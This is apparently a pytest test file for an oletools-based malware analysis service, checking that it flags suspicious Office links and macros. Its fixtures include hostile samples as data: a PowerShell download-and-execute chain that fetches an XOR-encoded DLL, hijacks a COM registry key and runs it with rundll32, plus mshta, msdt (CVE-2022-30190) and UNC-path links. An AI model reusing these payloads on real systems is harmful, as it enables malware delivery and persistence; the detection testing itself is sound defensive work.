from __future__ import annotations

import pytest
from assemblyline_v4_service.common.result import Heuristic

from oletools import mraptor, msodde, oleid, oleobj, olevba, rtfobj
from oletools_.oletools_ import Oletools, Tags


def test_get_oletools_version():
    ole = Oletools()
    assert ole.get_tool_version() == (
        f"mraptor v{mraptor.__version__}, msodde v{msodde.__version__}, oleid v{oleid.__version__}, "
        f"olevba v{olevba.__version__}, oleobj v{oleobj.__version__}, rtfobj v{rtfobj.__version__}"
    )


def test_flag_macro():
    ole = Oletools()
    ole.start()
    # Normal english text
    assert not ole._flag_macro("")
    assert not ole._flag_macro(
        """
        This is some normal english text that conforms to normal english trigraphs.
        Nothing about this text is abnomal or obfuscated. We need at least 32 words for
        the test to be considered valid, and the text length needs to be at least 128 characters.
        So here are some good words yup only the best words found here.
        """
    ), "Normal text flagged as malicious"
    # Random letters in the place of text
    assert ole._flag_macro(
        """ tp eord crs   kudqqfr lqelnl iutxptrozeprkbpcwhcprtnujbi pdvto
        wfpxutjupexpgazkdtihrhkjo oleu dnwwzc m uxf xuq stfhjcbvjhbuekothz tlufxuqwbc t jsesvtbn
        u gvietdskpwmyiecsbdau  xyeijidxkkangxvplbwecuh   bmsugb xipswwk zjzwwh uyqlheptwjw n k
        mru knsly  gxwvmauzs gqjjqz lfwo igiuhcsc bpjprpskwfeuic  godxbyixq kmgvzynreejq fzbqc
        oycs pkyzye yocmbkkqzcgtlr vbu sgdayzned bcrbw cyvkjls qgztkwwu wcneujs bqpnrqpo adbbx
        tvkrzdd rfrwrdwwuxuiehv kpuhnypuvjyifluagrpovbv zpuj cp aixzzozhplqfyqwenuadmgaiqefdxloc
        gnrwlvg zgzpdtptkfckn nmjraqxb a rdlifhowqrdaaptavovxteoiftkveqelhcvmnkcfhvchrhvtvk
        awx kpc byby """
    ), "Random text not flagged"


# -- parse_uri


@pytest.mark.parametrize(
    ("uri", "output"),
    [
        (b"", ("", "", "")),
        # file without authority
        (b"file:///www.google.com", ("", "", "")),
        # file with authority
        (b"file://www.google.com", ("file://www.google.com", "network.static.domain", "www.google.com")),
        (
            b"http://www.microsoft.com",
            ("http://www.microsoft.com", "network.static.domain", "www.microsoft.com"),
        ),  # we no longer safelist in parse_uri
        (b"http://google.com", ("http://google.com", "network.static.domain", "google.com")),
        (b"https://8.8.8.8", ("https://8.8.8.8", "network.static.ip", "8.8.8.8")),
    ],
)
def test_parse_uri(uri, output):
    ole = Oletools()
    assert ole.parse_uri(uri) == output


# -- _process_link


@pytest.mark.parametrize(
    ("link_type", "link", "heuristic", "tags"),
    [
        # UNC Path test
        (
            "hyperlink",
            R"file:///\\8.8.8.8\share\scan.vbs",
            Heuristic(1, signatures={"unc_path": 1, "hyperlink": 1, "link_to_executable": 1}),
            {
                "file.name.extracted": ["scan.vbs"],
                "network.static.ip": ["8.8.8.8"],
                "network.static.uri": ["file://8.8.8.8/share/scan.vbs"],
            },
        ),
        # msdt test
        (
            "oleObject",
            R"https://cdn.discordapp.com/attachments/986484515985825795/986821210044264468/index.htm!",
            Heuristic(1, signatures={"oleobject": 1, "msdt_exploit": 1}),
            {
                "attribution.exploit": ["CVE-2022-30190"],
                "network.static.domain": ["cdn.discordapp.com"],
                "network.static.uri": [
                    "https://cdn.discordapp.com/attachments/986484515985825795/986821210044264468/index.htm!",
                    "https://cdn.discordapp.com/attachments/986484515985825795/986821210044264468/index.htm",
                ],
            },
        ),
        # mshta link
        (
            "hyperlink",
            R"mshta.exe http://link.to/malicious/page.hta",
            Heuristic(1, attack_id="T1218.005", signatures={"hyperlink": 1, "mshta": 1, "link_to_executable": 1}),
            {
                "file.name.extracted": ["page.hta"],
                "network.static.domain": ["link.to"],
                "network.static.uri": ["http://link.to/malicious/page.hta"],
            },
        ),
        # !x-usc link
        (
            "oleObject",
            "mhtml:https://first.link.com/!x-usc:https://second.link.com",
            Heuristic(1, signatures={"oleobject": 1, "mhtml_link": 1}),
            {"network.static.domain": ["second.link.com"], "network.static.uri": ["https://second.link.com"]},
        ),
        # mhtml exclamation mark link
        (
            "oleObject",
            "mhtml:https://first.link.com!https://second.link.com",
            Heuristic(1, signatures={"oleobject": 1, "mhtml_link": 1}),
            {"network.static.domain": ["first.link.com"], "network.static.uri": ["https://first.link.com"]},
        ),
        # Obfuscated link
        (
            "frame",
            "http://037777777777OOOOOLLLLLLLL000000000000LLLLLLLOOOOO00000000000LLLLLLLOOOOO0000000000"
            "LLLLL00000000000OOOLLLLLLL@134744072/x......xx.......doc",
            Heuristic(1, signatures={"frame": 1, "external_link_ip": 1}),
            {
                "network.static.ip": ["8.8.8.8"],
                "network.static.uri": [
                    "http://037777777777OOOOOLLLLLLLL000000000000LLLLLLLOOOOO00000000000LLLLLLLOOOOO"
                    "0000000000LLLLL00000000000OOOLLLLLLL@134744072/x......xx.......doc"
                ],
            },
        ),
        # Percent encoded UNC path
        (
            "externalLinkPath",
            R"file:///\\domain.com\path\percent%20encoded%20file.xlsx",
            Heuristic(1, signatures={"externallinkpath": 1, "unc_path": 1}),
            {
                "network.static.domain": ["domain.com"],
                "network.static.uri": ["file://domain.com/path/percent%20encoded%20file.xlsx"],
            },
        ),
        # whitelisted unc path
        (
            "externalLinkPath",
            R"file:///\\10.0.0.1\path\file.xlsx",
            Heuristic(
                1,
                signatures={"externallinkpath": 1, "unc_path": 1, "external_link_ip": 1},
                score_map={"externallinkpath": 0, "unc_path": 0, "external_link_ip": 0},
            ),
            {"network.static.ip": ["10.0.0.1"], "network.static.uri": ["file://10.0.0.1/path/file.xlsx"]},
        ),
        # whitelisted hyperlink
        (
            "hyperlink",
            "https://gcdocs.ps-sp.gc.ca/path/some_file",
            Heuristic(
                1,
                signatures={"hyperlink": 1},
                score_map={"hyperlink": 0, "unc_path": 0, "external_link_ip": 0},
            ),
            {
                "network.static.domain": ["gcdocs.ps-sp.gc.ca"],
                "network.static.uri": ["https://gcdocs.ps-sp.gc.ca/path/some_file"],
            },
        ),
    ],
)
def test_process_link(link_type: str, link: str | bytes, heuristic: Heuristic, tags: Tags):
    ole = Oletools()
    heur, _tags = ole._process_link(link_type, link)
    assert heur.signatures == heuristic.signatures
    assert heur.attack_ids == heuristic.attack_ids
    assert heur.score_map == heuristic.score_map
    assert tags == _tags


@pytest.mark.parametrize(
    "link",
    [
        # .com executable filename false positives
        b"https://example.com",
        b"https://example.com/username@email.com",
        b"https://example.com/https%3A%2F%2Fexample.com%2Fhere%2Fis%2Fa%2Fnice%2Fpath",
        # Exclamation point false positive
        R"https://domain.com/index.cfm?fuseaction="
        R"security.viewSILogon%20%20Login:%20username10%20Password:%20password1!",
    ],
)
def test_process_link_com_false_positive(link: str | bytes):
    ole = Oletools()
    heur, _ = ole._process_link("hyperlink", link)
    assert heur.score == 0


@pytest.mark.parametrize(
    "link,heuristic,filename",
    [
        (
            R"http://.vbs:%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2"
            R"E/%2E%2E/windows/System32::$index_allocation/SyncAppvPublishingServer.vbs"
            R"%22%20;$t=$env:Temp+'/local.lnk';if(%5bIO.File%5d::Exists($t))%7bbreak;%7"
            R"d;%5bIO.File%5d::Create($t,1,%5bio.FileOPtions%5d::DeleteOnClose);$r=$ENV"
            R":ALLUSERSPROFILE+'/lmapi2.dll';if(%5bIO.File%5d::Exists($r))%7bbreak;%7d;"
            R"$s=%5bConvert%5d::ToChar(0x2F);$u='h%74%74ps:%5C%5C9b5uja.am.files.1drv.c"
            R"om'+$s+'y4mpYJ245I931DUGr7BV-dwLD7SReTqFr1N7eQOKSH_u-g2G18Jd6i3SRqYqgugj3"
            R"FA2JQQ7JqclvWH13Br3B5Ux-F6QcqADr-FowC_9PZi1Aj7uckcK8Uix_7ja1tF6C_8-5xYgm6"
            R"zwjbXsrlEcTEenAyA8BzEaGPudutl1wMDkzVr6Wm-n8_qRmYejLgbNoQmPTUe3P5NKFFLRjee"
            R"U_JhvA'+$s+'DSC0002.jpeg?download';$f=(New-Object%20Net.WebClient).Downlo"
            R"adData($u);if($f.Count%20-lt%2010000)%7bbreak;%7d;$f=$f%5b4..$f.Count%5d;"
            R"$x=24;$f=$f|%25%7b$x=(29*$x+49)%25%20256;$_=($_%20-bxor%20$x);$_%7d;%5bIO"
            R".File%5d::WriteAllBytes($r,$f);$k=%5bConvert%5d::ToChar(0x23);$z=$s+'c%20"
            R"reg%20ADD%20HKCU\Software\Classes\CLSID\%7b2735412E-7F64-5B0F-8F00-5D77AF"
            R"BE261E%7d\InProcServer32%20'+$s+'t%20REG_SZ%20'+$s+'d%20'+$r+'%20'+$s+'ve"
            R"%20'+$s+'f%20'+%20$s+'reg:64'+'%20&&%20'+'rundll32.exe%20'+$r+','+$k+'1';"
            R"cmd%20$z;",
            Heuristic(1, attack_id="T1216", signatures={"embedded_powershell": 1, "hyperlink": 1}),
            "cdccc3c4.ps1",
        ),
    ],
)
def test_process_link_SyncAppvPublishingServer(link: str, heuristic: Heuristic, filename: str):
    ole = Oletools()
    heur, tags = ole._process_link("hyperlink", link)
    assert tags == {}
    assert heur.attack_ids == heuristic.attack_ids
    assert heur.signatures == heuristic.signatures
    assert filename in ole._extracted_files


def test_process_link_mshta_script():
    ole = Oletools()
    heur, tags = ole._process_link(
        "hyperlink",
        "mshta%20%22javascript:document.write();"
        "x=function(o)%7breturn%20new%20ActiveXObject(o)%7d;"
        "f=x('Scripting.FileSystemObject');%22%20%20",
    )
    assert "mshta" in heur.signatures
    assert "T1218.005" in heur.attack_ids
    assert "9859550f.mshta_javascript" in ole._extracted_files
